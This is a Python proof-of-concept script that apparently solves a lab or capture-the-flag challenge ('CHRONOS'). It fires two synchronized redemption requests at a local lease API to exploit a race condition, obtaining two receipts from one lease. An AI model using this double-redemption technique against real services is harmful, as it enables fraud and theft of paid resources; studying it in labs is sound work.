import json
import sys
import threading
import urllib.request
import urllib.error
import http.cookiejar

from concurrent.futures import ThreadPoolExecutor


BASE = sys.argv[1] if len(sys.argv) > 1 else (
    "http://127.0.0.1:5000"
)

# Establish one browser session for all requests.
cookies = http.cookiejar.CookieJar()

client = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cookies)
)


def send_request(path, data, cookie_header=None, use_client=False):
    request = urllib.request.Request(
        BASE + path,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST",
    )

    if cookie_header:
        request.add_header("Cookie", cookie_header)

    opener = (
    	client
    	if use_client
    	else urllib.request.build_opener()
    )

    try:
        with opener.open(request, timeout=10) as response:
            status = response.status
            body = response.read()

    except urllib.error.HTTPError as error:
        status = error.code
        body = error.read()

    return status, json.loads(body)


# 1. Obtain a new lease.
status, issued = send_request(
    "/api/v1/lease/issue",
    {},
    use_client=True,
)

print("LEASE ISSUANCE:", status)

if status != 201:
    raise SystemExit(f"Lease issuance failed: {issued}")

lease_id = issued["lease_id"]

# Preserve the SAME session cookie for both concurrent requests.
cookie_header = "; ".join(
    f"{cookie.name}={cookie.value}"
    for cookie in cookies
)

if not cookie_header:
    raise SystemExit("No session cookie was received.")

print("Lease lifetime:", issued["lifetime_ms"], "ms")
print("Preparing two simultaneous redemption requests...")


# 2. Synchronize both client threads before they send their requests.
barrier = threading.Barrier(2)


def redeem():
    barrier.wait(timeout=5)

    return send_request(
        "/api/v1/lease/redeem",
        {"lease_id": lease_id},
        cookie_header=cookie_header,
    )


# 3. Send both requests concurrently.
with ThreadPoolExecutor(max_workers=2) as executor:
    futures = [
        executor.submit(redeem),
        executor.submit(redeem),
    ]

    results = [future.result() for future in futures]


for number, (status, body) in enumerate(results, start=1):
    print(f"\nREDEMPTION {number}: HTTP {status}")
    print(json.dumps(body, indent=2))


# 4. Both requests must create different receipts.
if not all(status == 201 for status, _ in results):
    raise SystemExit(
        "\nRACE NOT REPRODUCED. "
        "Run the script again with a fresh session."
    )

receipts = [body["receipt"] for _, body in results]

if receipts[0]["receipt_id"] == receipts[1]["receipt_id"]:
    raise SystemExit("ERROR: Receipt IDs are not distinct.")

if receipts[0]["lease_id"] != receipts[1]["lease_id"]:
    raise SystemExit("ERROR: The receipts used different leases.")

print("\nPASS: Two distinct receipts came from the same lease.")


# 5. Submit both receipts to the protected archive.
status, archive = send_request(
    "/api/v1/archive/mission",
    {"receipts": receipts},
    cookie_header=cookie_header,
)

print("\nARCHIVE RESPONSE:", status)
print(json.dumps(archive, indent=2))

if status != 200:
    raise SystemExit("Archive validation failed.")

print("\nSUCCESS: The intended CHRONOS race condition is reproducible.")
